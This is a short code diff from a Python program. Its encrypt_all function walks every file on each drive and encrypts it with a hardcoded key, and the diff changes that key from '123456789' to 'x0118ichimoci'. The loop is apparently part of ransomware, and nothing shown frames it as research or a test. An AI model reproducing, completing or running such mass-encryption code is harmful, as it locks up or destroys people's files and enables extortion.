@@ -262,7 +262,7 @@ def encrypt_all():
         file_iterator = get_all_files(drive)
         for file_path in file_iterator:
             try:
-                encrypt_file(file_path, b"123456789")
+                encrypt_file(file_path, b"x0118ichimoci")
             except IOError:
                 return False
 
